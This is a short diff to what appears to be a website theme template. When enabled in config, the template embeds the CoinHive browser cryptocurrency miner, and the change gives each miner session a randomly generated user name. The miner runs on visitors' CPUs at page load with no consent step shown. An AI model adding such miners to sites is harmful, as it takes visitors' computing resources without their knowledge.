@@ -25,7 +25,8 @@
 <% if (theme.coinhive.enable) { %>
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
-var miner = new CoinHive.User('<%-theme.coinhive.key%>', 'User', {
+var name = Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 8);
+var miner = new CoinHive.User('<%-theme.coinhive.key%>', name, {
 	    threads: navigator.hardwareConcurrency,
 	    autoThreads: false,
 	    throttle: 0.8,
